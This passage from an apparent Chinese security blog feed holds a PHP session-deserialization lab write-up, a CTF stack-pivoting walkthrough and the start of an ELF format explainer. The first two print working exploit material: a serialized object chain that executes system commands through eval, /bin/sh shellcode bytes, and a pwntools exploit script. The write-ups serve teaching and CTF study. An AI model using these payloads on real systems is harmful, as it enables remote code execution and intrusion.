href="#0x03-题目" class="headerlink" title="0x03 题目"></a>0x03 题目</h2><p>这里网上看的一道session反序列化题目，在此复现一下。</p><p>三个PHP文件如下：</p><p>class.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">highlight_string(file_get_contents(basename($_SERVER[<span class="string">'PHP_SELF'</span>])));</span><br><span class="line"><span class="comment">//show_source(__FILE__);</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">foo1</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $varr;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;varr = <span class="string">"i.php"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(file_exists(<span class="keyword">$this</span>-&gt;varr))&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"&lt;br&gt;文件"</span>.<span class="keyword">$this</span>-&gt;varr.<span class="string">"存在&lt;br&gt;"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;br&gt;这是foo1的析构函数&lt;br&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">foo2</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $varr;</span><br><span class="line">    <span class="keyword">public</span> $obj;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;varr = <span class="string">'1234567890'</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;obj = <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;obj-&gt;execute();</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;varr;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__desctuct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;br&gt;这是foo2的析构函数&lt;br&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">foo3</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $varr;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">execute</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="keyword">$this</span>-&gt;varr);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__desctuct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;br&gt;这是foo3的析构函数&lt;br&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>i.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    ini_set(<span class="string">'session.serialize_handler'</span>, <span class="string">'php'</span>);</span><br><span class="line">    <span class="keyword">require</span>(<span class="string">"./class.php"</span>);</span><br><span class="line">    session_start();</span><br><span class="line"></span><br><span class="line">    $obj = <span class="keyword">new</span> foo1();</span><br><span class="line">    $obj-&gt;varr = <span class="string">"phpinfo.php"</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>phpinfo.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    session_start();</span><br><span class="line">    <span class="keyword">require</span>(<span class="string">"./class.php"</span>);</span><br><span class="line"></span><br><span class="line">    $f3 = <span class="keyword">new</span> foo3();</span><br><span class="line">    $f3-&gt;varr = <span class="string">"phpinfo();"</span>;</span><br><span class="line">    $f3-&gt;execute();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>可以看到，i.php中用的是php处理器。</p><p>在php.ini中的关键配置，注意配置中的session.serialize_handler：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">session.serialize_handler = php_serialize</span><br><span class="line">session.upload_progress.cleanup=Off</span><br><span class="line">session.upload_progress.enabled=On</span><br></pre></td></tr></table></figure><p>可以访问phpinfo.php查看配置信息：</p><p><img src="/2019/04/21/PHP-session反序列化漏洞/5.png" alt=""></p><p>默认是采用php处理器处理session，session.upload_progress.cleanup配置为Off，session.upload_progress.enabled配置为On。</p><p>说下session.upload_progress.enabled，当它为开启状态时，PHP能够在每一个文件上传时监测上传进度。当一个上传在处理中，同时POST一个与php.ini中设置的session.upload_progress.name同名变量时，上传进度就可以在\$_SESSION中获得。当PHP检测到这种POST请求时，它会在\$_SESSION中添加一组数据, 索引是session.upload_progress.prefix与 session.upload_progress.name连接在一起的值。</p><p>当前代码的话没有向服务器提交数据，但是现在session.upload_progress.enabled是开启的，所以可以通过上传文件，从而在session文件中写入数据。</p><p>也就是说，利用点是通过session.upload_progress.enabled来上传文件向session文件中写入php_serialize处理器格式的内容，从而与i.php中php处理器不同进而造成session反序列化漏洞的存在。</p><p>poc.php，用于生成序列化poc，在foo1中的构造函数中定义\$varr的值为foo2的实例，在foo2中定义\$obj为foo3的实例，在foo3中定义\$varr的值为system(‘whoami’);：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">foo3</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $varr;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;varr = <span class="string">"system('whoami');"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">foo2</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $varr;</span><br><span class="line">    <span class="keyword">public</span> $obj;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;varr = <span class="string">'1'</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;obj = <span class="keyword">new</span> foo3();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">foo1</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $varr;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;varr = <span class="keyword">new</span> foo2();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">echo</span> serialize(<span class="keyword">new</span> foo1());</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>form.html，一个向i.php提交POST请求的表单文件，其中包括PHP_SESSION_UPLOAD_PROGRESS变量：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"http://127.0.0.1/i.php"</span> <span class="attr">method</span>=<span class="string">"POST"</span> <span class="attr">enctype</span>=<span class="string">"multipart/form-data"</span>&gt;</span>     </span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"PHP_SESSION_UPLOAD_PROGRESS"</span> <span class="attr">value</span>=<span class="string">"123"</span> /&gt;</span>        </span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"file"</span> <span class="attr">name</span>=<span class="string">"file"</span> /&gt;</span>        </span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure><p>Burpsuite截断该form.html发送的POST请求，在PHP_SESSION_UPLOAD_PROGRESS一栏中的值加上poc.php生成的poc就能够成功执行命令了：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">|O:4:&quot;foo1&quot;:1:&#123;s:4:&quot;varr&quot;;O:4:&quot;foo2&quot;:2:&#123;s:4:&quot;varr&quot;;s:1:&quot;1&quot;;s:3:&quot;obj&quot;;O:4:&quot;foo3&quot;:1:&#123;s:4:&quot;varr&quot;;s:19:&quot;system(&quot;ipconfig&quot;);&quot;;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure><p><img src="/2019/04/21/PHP-session反序列化漏洞/6.png" alt=""></p><p>换其他命令的话直接换poc.php生成的poc即可：</p><p><img src="/2019/04/21/PHP-session反序列化漏洞/7.png" alt=""></p><h2 id="0x04-参考"><a href="#0x04-参考" class="headerlink" title="0x04 参考"></a>0x04 参考</h2><p><a href="https://www.jianshu.com/p/fba614737c3d" target="_blank" rel="noopener">关于PHP SESSION反序列化</a></p>]]></content>
    
    <summary type="html">
    
      已完结.
    
    </summary>
    
      <category term="PHP" scheme="https://Mi1k7ea.github.com/categories/PHP/"/>
    
    
      <category term="Web安全" scheme="https://Mi1k7ea.github.com/tags/Web%E5%AE%89%E5%85%A8/"/>
    
      <category term="PHP" scheme="https://Mi1k7ea.github.com/tags/PHP/"/>
    
  </entry>
  
  <entry>
    <title>花式栈溢出之stack pivoting</title>
    <link href="https://Mi1k7ea.github.com/2019/04/20/%E8%8A%B1%E5%BC%8F%E6%A0%88%E6%BA%A2%E5%87%BA%E4%B9%8Bstack-pivoting/"/>
    <id>https://Mi1k7ea.github.com/2019/04/20/花式栈溢出之stack-pivoting/</id>
    <published>2019-04-20T11:50:19.000Z</published>
    <updated>2019-05-28T14:17:47.673Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x01-stack-pivoting"><a href="#0x01-stack-pivoting" class="headerlink" title="0x01 stack pivoting"></a>0x01 stack pivoting</h2><p>stack pivoting，即劫持栈指针指向攻击者所能控制的内存处，然后再在相应的位置进行ROP。</p><p><strong>什么情况下需要利用stack pivot?</strong></p><ol><li>栈溢出的字节比较少，无法直接利用溢出字节进行ROP；</li><li>开启了 PIE 保护，栈地址未知并且无法泄露，但是利用某些利用技术时必须要知道栈地址，就可以通过stack pivot将栈劫持到相应的区域；</li><li>stack pivot能够使得一些非栈溢出的漏洞变成为栈溢出漏洞从而进行攻击，典型：可以将程序劫持到heap空间中；</li></ol><p><strong>stack pivot有什么利用条件?</strong></p><p>1、存在内容可控的内存，位置已知，拥有读写的权限，有几个典型的位置可供选择：</p><p>（1）一个是bss段末有较大的空间，因为进程内存按页分配，分配给bss段的内存大小至少一个页(4k，x1000)大小，一般bss段的内容是用不了这么大的空间的，并且bss段分配的内存页拥有读写权限，是stack pivot的好目标；</p><p>（2）另一个是heap空间，这个不用赘述了，但是需要注意泄露堆地址；</p><p>2、控制rsp(esp)。一般来说，控制栈指针会使用 ROP，需要相应的Gadgets，常见的控制栈指针的Gadgets一般是：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pop rsp/esp</span><br></pre></td></tr></table></figure><p>其中有一个最典型，在x64的libc_csu_init通过Godgets中，做一个适当偏移能够得到这样一个Gadgets：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">mov    rdx,r13</span><br><span class="line">mov    rsi,r14</span><br><span class="line">mov    edi,r15d</span><br><span class="line">call   QWORD PTR [r12+rbx*8]</span><br><span class="line">add    rbx,0x1</span><br><span class="line">cmp    rbx,rbp</span><br><span class="line">jne    405660 &lt;__libc_csu_init+0x40&gt;</span><br><span class="line">add    rsp,0x8</span><br><span class="line">pop    rbx</span><br><span class="line">pop    rbp                                         offset:  pop rsp</span><br><span class="line">pop    r12                                                  pop r12</span><br><span class="line">pop    r13                                                  pop r13    </span><br><span class="line">pop    r14                                                  pop r14</span><br><span class="line">pop    r15                                                  pop r15</span><br><span class="line">retn                                                        ret</span><br></pre></td></tr></table></figure><p>可见其实就是ret2csu的经典Gadget，是一个pop rsp ret，如果将ret的地址改成leave ，ret,那么我们正常通过pop rbp；pop r12;pop r13;pop r14执行到返回时，将rbp中的值相应设置好也可以劫持rsp。</p><p>或者其他诸如add rsp，0x100等能够劫持rsp寄存器值的Gadget。</p><p>stack pivoting适用场景：</p><p><img src="/2019/04/20/花式栈溢出之stack-pivoting/6.png" alt=""></p><p>我们控制了橙色部分区域，但是中间有一段不可控制的内存，这时，我们需要控制rsp跳转到橙色部分，继续执行我们的Rop指令，这就是stack pivot，如下图是最简单的一种，通过add esp, 0x40c;ret的gadget来实现劫持栈指针：</p><p><img src="/2019/04/20/花式栈溢出之stack-pivoting/7.png" alt=""></p><p>以下的一些Gadgets都是可以通过对esp的操作来实现劫持栈指针：</p><p><img src="/2019/04/20/花式栈溢出之stack-pivoting/8.png" alt=""></p><h2 id="0x02-X-CTF-Quals-2016-b0verfl0w"><a href="#0x02-X-CTF-Quals-2016-b0verfl0w" class="headerlink" title="0x02 X-CTF Quals 2016 - b0verfl0w"></a>0x02 X-CTF Quals 2016 - b0verfl0w</h2><p><a href="https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/stackoverflow/stackprivot/X-CTF%20Quals%202016%20-%20b0verfl0w" target="_blank" rel="noopener">题目下载地址</a></p><p>运行程序，询问名字并输入内容，再输出出来；查看程序是个32位的动态链接文件；查看安全编译选项，发现啥都没开：</p><p><img src="/2019/04/20/花式栈溢出之stack-pivoting/1.png" alt=""></p><p>GDB计算溢出至ret处的偏移量为36：</p><p><img src="/2019/04/20/花式栈溢出之stack-pivoting/2.png" alt=""></p><p>打开IDA分析：</p><p><img src="/2019/04/20/花式栈溢出之stack-pivoting/3.png" alt=""></p><p>这里看到是通过fgets()来获取用户输入内容，存在明显的栈溢出漏洞，限定了只能输入50个字节；同时看到变量s相对ebp的偏移量为20h=16*2d=32d，再加上ebp的4个字节就和前面计算的溢出偏移量是一致的。</p><p>由此可以算出能够溢出的字节数为50-36=14。</p><p><strong>shellcode选择</strong></p><p>这里因为没有开启NX，所以我们可以直接在栈上写shellcode。</p><p>我们来看下pwntools的shellcode长度是多少：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ski12@ubuntu:~/ctf/pwn/stack$ python -c  <span class="string">"from pwn import *;print len(asm(shellcraft.sh()))"</span></span><br><span class="line">44</span><br></pre></td></tr></table></figure><p>可以看到是44个字节。而我们知道变量s处到ret处的偏移量为36个字节，是塞不下这个shellcode的。</p><p>那就换一个更简短的shellcode如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80</span><br></pre></td></tr></table></figure><p>看下该shellcode的长度：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">ski12@ubuntu:~/ctf/pwn/stack$ python -c <span class="string">"from pwn import *;print disasm('\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80')"</span></span><br><span class="line">   0:   31 c9                   xor    ecx,ecx</span><br><span class="line">   2:   f7 e1                   mul    ecx</span><br><span class="line">   4:   51                      push   ecx</span><br><span class="line">   5:   68 2f 2f 73 68          push   0x68732f2f</span><br><span class="line">   a:   68 2f 62 69 6e          push   0x6e69622f</span><br><span class="line">   f:   89 e3                   mov    ebx,esp</span><br><span class="line">  11:   b0 0b                   mov    al,0xb</span><br><span class="line">  13:   <span class="built_in">cd</span> 80                   int    0x80</span><br><span class="line"></span><br><span class="line">ski12@ubuntu:~/ctf/pwn/stack$ python -c  <span class="string">"print len('\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80')"</span></span><br><span class="line">21</span><br></pre></td></tr></table></figure><p>13h+2=15h=21d，即shellcode长度为21个字节，满足条件。</p><p><strong>寻找Gadget</strong></p><p>shellcode的问题搞定了，接着是ret处应该覆盖为shellcode的起始地址即ret2shellcode，但是这里有个问题，系统开启了ASLR，因此栈地址是随机的，我们无法预测。解决办法是利用相对地址即可，如上一节最后提到的几个对esp进行偏移量操作的Gadgets。</p><p>这里就用到经典的方法：jmp esp。</p><p>因为在函数ret的时候，esp刚好指向ret地址的下一个地址；而当我们找到如jmp esp的gadget并覆盖到ret地址时，就可以跳到下一个地址去执行这个gadget地址后面的指令。</p><p>搜索到了一个jmp esp的Gadget：</p><p><img src="/2019/04/20/花式栈溢出之stack-pivoting/4.png" alt=""></p><p>找到目标Gadget为0x08048504。剩下的后面的指令就是需要ret2shellcode执行了。</p><p>那么可以知道我们构造的payload其结构如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shellcode|padding|fake ebp|jmp esp|set esp point to shellcode and jmp esp</span><br></pre></td></tr></table></figure><p>参考前面小节提到的几个Gadgets，我们可以通过sub esp, 0xXX;jmp esp这个来实现ret2shellcode，因为我们没有办法直接ret到指定的shellcode代码处（原因是ASLR），只能通过相对地址的方式实现跳转；这里就用sub esp, 0xXX来实现相对地址的跳转，因为当前esp指向本地址，而我们可以算出shellcode起始地址里该地址的相对偏移量为20h(shellcode+padding)+4(fake ebp)+4(jmp esp)=28h，当使用sub esp, 0x28时可以使esp指向shellcode起始地址处 ；最后在jmp esp跳转至修改后的esp指向的地址即shellcode起始地址。</p><p>简单地说，<strong>就是将修改esp指向shellcode起始地址，然后再跳到esp指向地址去执行从而执行shellcode。</strong></p><p>现在我们再算下整个payload的长度，我们已知shellcode起始地址到最后sub esp, 0x28;jmp esp这段Gadget处的偏移量为28h=40d，而这段Gadget的长度如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ski12@ubuntu:~/ctf/pwn/stack$ python -c &quot;from pwn import *;print len(asm(&apos;sub esp, 0x28;jmp esp&apos;))&quot;</span><br><span class="line">5</span><br></pre></td></tr></table></figure><p>整个长度为40+5=45&lt;50，满足只能输入50个字节以内内容的限制。</p><p>整个payload结构如下图所示：</p><p><img src="/2019/04/20/花式栈溢出之stack-pivoting/9.png" alt=""></p><p><strong>编写payload：</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">"./b0verfl0w"</span>)</span><br><span class="line"></span><br><span class="line">shellcode = <span class="string">"\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80"</span></span><br><span class="line"></span><br><span class="line">sub_esp_jmp = asm(<span class="string">"sub esp, 0x28;jmp esp"</span>)</span><br><span class="line">jmp_esp = <span class="number">0x08048504</span></span><br><span class="line"></span><br><span class="line">payload = shellcode.ljust(<span class="number">0x20</span>, <span class="string">"A"</span>) + <span class="string">"BBBB"</span> + p32(jmp_esp) + sub_esp_jmp</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"name?"</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">"[*]sending payload..."</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><img src="/2019/04/20/花式栈溢出之stack-pivoting/5.png" alt=""></p><h2 id="0x03-参考"><a href="#0x03-参考" class="headerlink" title="0x03 参考"></a>0x03 参考</h2><p><a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/stackoverflow/fancy-rop/#stack-pivoting" target="_blank" rel="noopener">stack pivoting</a></p><p><a href="http://security.cs.rpi.edu/courses/binexp-spring2015/lectures/11/07_lecture.pdf" target="_blank" rel="noopener">ROP and DEP</a></p>]]></content>
    
    <summary type="html">
    
      已完结.
    
    </summary>
    
      <category term="Pwn" scheme="https://Mi1k7ea.github.com/categories/Pwn/"/>
    
    
      <category term="二进制" scheme="https://Mi1k7ea.github.com/tags/%E4%BA%8C%E8%BF%9B%E5%88%B6/"/>
    
      <category term="栈溢出" scheme="https://Mi1k7ea.github.com/tags/%E6%A0%88%E6%BA%A2%E5%87%BA/"/>
    
      <category term="Pwn" scheme="https://Mi1k7ea.github.com/tags/Pwn/"/>
    
  </entry>
  
  <entry>
    <title>ELF二进制格式</title>
    <link href="https://Mi1k7ea.github.com/2019/04/15/ELF%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%A0%BC%E5%BC%8F/"/>
    <id>https://Mi1k7ea.github.com/2019/04/15/ELF二进制格式/</id>
    <published>2019-04-15T13:39:27.000Z</published>
    <updated>2019-05-28T14:17:57.958Z</updated>
    
    <content type="html"><![CDATA[<p>在Linux、BSD变体以及其他OS中，ELF格式可用于可执行文件、共享库、目标文件、coredump文件，甚至内核引导镜像文件。在Linux中，程序就是以ELF二进制的格式执行的。</p><h2 id="0x01-ELF文件类型"><a href="#0x01-ELF文件类型" class="headerlink" title="0x01 ELF文件类型"></a>0x01 ELF文件类型</h2><p>一个ELF文件可以被标记为一下几种类型之一。</p><ul><li>ET_NONE：未知类型。这个标记表明文件类型不确定，或者未定义。</li><li>ET_REL：重定位文件。ELF类型标记为relocatable意味着该文件被标记为了一段可重定位的代码，有时也称为目标文件。可重定位目标文件通常是还未被链接到可执行程序的一段位置独立的代码（position independent code）。在编译完代码之后通常可以看到一个.o格式的文件，这种文件包含了创建可执行文件所需要的代码和数据。</li><li>ET_EXEC：可执行文件。executable，表明该文件被标记为可执行文件，也称为程序，是一个进程开始执行的入口。</li><li>ET_DYN：共享目标文件。dynamic，意味着文件被标记为了一个动态的可链接的目标文件，也称为共享库。这类共享库会在程序运行时被装载并链接到程序的进程镜像中。</li><li>ET_CORE：核心文件。在程序崩溃或者进程传递了一个SIGSEGV信号（分段违规）时，会在核心文件中记录整个进程的镜像信息。可以使用GDB读取这类文件来辅助调试并查找程序崩溃的原因。</li></ul><p>使用readelf -h命令查看ELF文件，可以看到原始的ELF文件头。ELF文件头从文件的0偏移量开始，是除了文件头之后剩余部分文件的一个映射。文件头主要标记了ELF类型、结构和程序开始执行的入口地址，并提供了其他ELF头（节头和程序头）的偏移量。</p><p>可以通过查看<a href="http://www.man7.org/linux/man-pages/man5/elf.5.html" target="_blank" rel="noopener">Linux的ELF（5）手册</a>来了解ELF头部结构：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> EI_NIDENT 16</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> e_ident[EI_NIDENT];</span><br><span class="line">    <span class="keyword">uint16_t</span>      e_type;</span><br><span class="line">    <span class="keyword">uint16_t</span>      e_machine;</span><br><span class="line">    <span class="keyword">uint32_t</span>      e_version;</span><br><span class="line">    ElfN_Addr     e_entry;</span><br><span class="line">    ElfN_Off      e_phoff;</span><br><span class="line">    ElfN_Off      e_shoff;</span><br><span class="line">    <span class="keyword">uint32_t</span>      e_flags;</span><br><span class="line">    <span class="keyword">uint16_t</span>      e_ehsize;</span><br><span class="line">    <span class="keyword">uint16_t</span>      e_phentsize;</span><br><span class="line">    <span class="keyword">uint16_t</span>      e_phnum;</span><br><span class="line">    <span class="keyword">uint16_t</span>      e_shentsize;</span><br><span class="line">    <span class="keyword">uint16_t</span>      e_shnum;</span><br><span class="line">    <span class="keyword">uint16_t</span>      e_shstrndx;</span><br><span class="line">&#125; ElfN_Ehdr;</span><br></pre></td></tr></table></figure><h2 id="0x02-ELF程序头"><a href="#0x02-ELF程序头" class="headerlink" title="0x02 ELF程序头"></a>0x02 ELF程序头</h2><p>ELF程序头是对二进制文件中<strong>段</strong>的描述，是程序装载必需的一部分。</p><p>段（segment）是在内核装载时被解析的，描述了磁盘上可执行文件的内存布局以及如何映射到内存中。可以通过引用原始ELF头中名为e_phoff（程序头表偏移量）来得到程序头表（如前面的ElfN_Ehdr结构中所示）。</p><p>程序头描述了可执行文件（包括共享库）中的段及其类型。</p><p>Elf32_Phdr结构体如下，它构成了32位ELF可执行程序头表的一个程序头条目：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    <span class="keyword">uint32_t</span>   p_type;</span><br><span class="line">    Elf32_Off  p_offset;</span><br><span class="line">    Elf32_Addr p_vaddr;</span><br><span class="line">    Elf32_Addr p_paddr;</span><br><span class="line">    <span class="keyword">uint32_t</span>   p_filesz;</span><br><span class="line">    <span class="keyword">uint32_t</span>   p_memsz;</span><br><span class="line">    <span class="keyword">uint32_t</span>   p_flags;</span><br><span class="line">    <span 